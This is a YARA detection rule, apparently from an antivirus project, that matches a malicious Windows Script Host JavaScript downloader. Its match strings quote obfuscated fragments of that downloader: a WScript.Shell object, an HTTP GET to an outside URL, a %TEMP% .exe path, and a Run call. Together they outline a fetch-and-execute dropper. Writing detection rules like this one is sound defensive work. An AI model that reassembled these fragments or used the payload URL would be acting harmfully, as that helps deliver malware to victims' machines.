rule sig_20160328_829f16ea3cca6ed58ab7ba469616a946 {
  meta:
    description = "datamaliciousorder - file 20160328_829f16ea3cca6ed58ab7ba469616a946.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "009b71257481684505484ee7977c28d1a6a92757bff291058485f834d9e54ab1"

  strings:
    $s1  = "function Pbceqypoc() {return Kgbpwkaq[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"yr5OUlYC.exe\";};" fullword ascii
    $s2  = "do {WScript[Kjpiip](Htumazvxxs() * 11)} while (Bqwxove[\"readystate\"] < 4 );" fullword ascii
    $s3  = "Bqwxove[Vindf](\"GET\", \"http://www.cloudfire.pt/l3iska\", false);" fullword ascii
    $s4  = "function Qbtltjtt(Elbuz, Mjtfyb){return Elbuz - Mjtfyb;};" fullword ascii
    $s5  = "var Kgbpwkaq = function Reevkz() {return WScript[Lcywjwiuce](\"WScript.Shell\");}();" fullword ascii
    $s6  = "function Njmkhmx(Epgtygc){Kgbpwkaq[\"Run\"](Epgtygc, Qjhftn, Qjhftn);};" fullword ascii
    $s7  = "function Mvsdkva() {return ((Hsnptp == true) && (Hsnptp == Rirgj)) ? 1 : Qjhftn;};" fullword ascii
    $s8  = "var Qevla = new this[\"Date\"]();" fullword ascii
    $s9  = "Rirgj = true; " fullword ascii
    $s10 = "function Dbkxfl(){return Qmfppq;};" fullword ascii
    $s11 = "var Bfiynsk = false;" fullword ascii
    $s12 = "function Htumazvxxs(){return 22;};" fullword ascii
    $s13 = "return Qbtltjtt(Whipsaayur, Rarldywj);" fullword ascii
    $s14 = " while (Oyczuebdl){" fullword ascii
    $s15 = "function Hlxaxkgr(Yzwztfntm) {var Glnzn = (1, 2, 3, 4, 5, Yzwztfntm); return Glnzn;};" fullword ascii
    $s16 = "Hsnptp = true; " fullword ascii
    $s17 = "var Rirgj = false;" fullword ascii
    $s18 = "function Uhetgksf(){return Lcywjwiuce;};" fullword ascii
    $s19 = "function Upvkib()" fullword ascii
    $s20 = "var Hsnptp = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}